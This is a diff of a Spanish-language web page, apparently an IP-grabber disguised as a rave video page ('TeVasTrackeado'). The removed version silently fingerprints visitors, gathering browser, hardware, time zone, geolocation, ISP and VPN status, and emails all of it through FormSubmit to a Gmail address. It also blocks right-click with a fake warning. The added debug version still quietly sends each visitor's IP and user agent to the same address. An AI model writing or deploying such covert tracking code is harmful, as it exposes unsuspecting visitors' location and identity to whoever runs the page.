@@ -3,153 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Prueba - Máxima Captura de Datos</title>
+    <title>PRUEBA DE ENVÍO CRÍTICO</title>
     <style>
-        /* --- ESTILOS RAVE/DARK --- */
-        body {
-            font-family: 'Arial Black', sans-serif;
-            text-align: center;
-            padding-top: 50px;
-            background-color: #121212;
-            color: #E0E0E0;
-        }
-        h1 {
-            color: #00ff99;
-            text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
-            margin-bottom: 5px;
-            transition: visibility 0.5s;
-        }
-        p {
-            color: #AAAAAA;
-            margin-top: 5px;
-        }
-        video {
-            border: 5px solid #ff00ff;
-            box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
-            border-radius: 8px;
-            margin-top: 20px;
-            transition: border-color 0.5s, box-shadow 0.5s;
-        }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #121212; color: #E0E0E0; }
+        h1 { color: red; }
     </style>
 </head>
 <body>
-    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
-    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
-
-    <video width="720" controls> 
-      <source src="clip.mp4" type="video/mp4">
-      Tu navegador no puede reproducir este video.
-    </video>
-
-    <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
+    <h1>PRUEBA CRÍTICA: ¿LLEGA ESTO?</h1>
+    <p>Si esto llega, el problema está en las APIs de escaneo.</p>
 
     <script>
-        // 📧 CORREO DE DESTINO:
         const FORM_SUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
-        
-        // --- 1. Recolección de datos del dispositivo ---
         const userAgent = navigator.userAgent;
-        const userLanguage = navigator.language || navigator.userLanguage;
-        const screenRes = window.screen.width + 'x' + window.screen.height;
-        const cpuCores = navigator.hardwareConcurrency || 'N/A';
-        const platform = navigator.platform;
-        const referrer = document.referrer || 'Acceso Directo';
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const colorDepth = screen.colorDepth;
-        
-        // --- FUNCIÓN PRINCIPAL: Escaneo Único de IP para Máxima Estabilidad ---
-        
-        // Escanear la IP con ip-api.com (Geo, ISP, Seguridad) en una sola llamada.
-        // Se usa un campo extenso para recopilar todos los datos necesarios.
-        const scanUrl = 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse,hosting,proxy,mobile';
 
-        fetch(scanUrl)
-            .then(geoResponse => geoResponse.json())
-            .then(geoData => {
+        // Intentar solo enviar la IP y el Agente de Usuario
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
                 
-                // Si el estado no es 'success', no podemos enviar el correo.
-                if (geoData.status !== 'success') {
-                    console.error("Error al escanear la IP:", geoData.message);
-                    return; 
-                }
-
-                const userIP = geoData.query || 'N/A';
-                
-                // Ensamblar TODOS los datos para el envío final
-                const finalPayload = {
-                    "_subject": "✅ DATOS RECIBIDOS (ESTABLE) - TeVasTrackeado", 
+                const payload = {
+                    "_subject": "🚨 PRUEBA DE ENVÍO CRÍTICO - DEBUG", 
                     "IP_Visitante": userIP,
-                    
-                    // --- DATOS DE GEOLOCALIZACIÓN Y RED ---
-                    "Geo_Pais_Region": `${geoData.country || 'N/A'} - ${geoData.regionName || 'N/A'} (${geoData.city || 'N/A'})`,
-                    "Coordenadas_GPS_IP": `${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}`,
-                    "Organizacion_ISP": geoData.isp || geoData.org || 'N/A',
-                    "ASN": geoData.as || 'N/A',
-                    "Codigo_Postal": geoData.zip || 'N/A',
-                    "Reverse_DNS": geoData.reverse || 'N/A', 
-
-                    // --- DATOS DE SEGURIDAD Y CONEXIÓN ---
-                    "Es_Proxy_VPN": geoData.proxy === true ? '🚨 SÍ' : 'No',
-                    "Es_Movil": geoData.mobile === true ? 'Sí' : 'No',
-                    "Es_Hosting_DataCenter": geoData.hosting === true ? 'Sí' : 'No',
-
-                    // --- DATOS DEL NAVEGADOR Y HARDWARE ---
                     "Agente_de_Usuario": userAgent,
-                    "Plataforma_SO": platform,
-                    "Nucleos_CPU": cpuCores,
-                    "Resolucion": screenRes,
-                    "Profundidad_Color": colorDepth,
-                    "Idioma": userLanguage,
-                    "Zona_Horaria": timeZone,
-                    "Referencia_Web": referrer,
-                    "Fecha_Hora_Visita": new Date().toLocaleString(),
+                    "Fecha_Hora": new Date().toLocaleString(),
+                    "NOTA": "Si recibes este correo, el fallo estaba en las APIs de escaneo avanzadas, NO en el envío a Gmail."
                 };
                 
-                // Paso Final: Enviar TODOS los datos al correo (FormSubmit)
-                return fetch(FORM_SUBMIT_ENDPOINT, {
+                // Envío directo a FormSubmit
+                fetch(FORM_SUBMIT_ENDPOINT, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     },
-                    body: JSON.stringify(finalPayload)
-                });
+                    body: JSON.stringify(payload)
+                })
+                .then(response => console.log('Intento de envío realizado.'))
+                .catch(error => console.error('Error de red al enviar:', error));
             })
-            .then(response => {
-                 // Esta parte confirma si FormSubmit respondió correctamente.
-                 if (response.ok) {
-                     console.log("Datos enviados con éxito a FormSubmit.");
-                 } else {
-                     console.error("Error de FormSubmit:", response.statusText);
-                 }
-            })
-            .catch(error => console.error('Fallo total en la ejecución del script:', error));
-    </script>
-    
-    <script>
-        // Efectos Visuales (Parpadeo, Clic Derecho, etc.)
-        function blink() {
-            var h1 = document.querySelector('h1');
-            h1.style.visibility = (h1.style.visibility === 'hidden' ? 'visible' : 'hidden');
-        }
-        setInterval(blink, 500);
-
-        function changeBorderColor() {
-            const video = document.querySelector('video');
-            const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6, '0');
-            video.style.borderColor = randomColor;
-            video.style.boxShadow = `0 0 25px ${randomColor}`;
-        }
-        setInterval(changeBorderColor, 2000);
-
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            alert("Advertencia: Intento de inspección registrado. Acceso denegado.");
-        });
-        
-        if (window.location.protocol === 'http:') {
-            window.location.protocol = 'https:';
-        }
+            .catch(error => console.error('Error al obtener la IP:', error));
     </script>
 </body>
 </html>
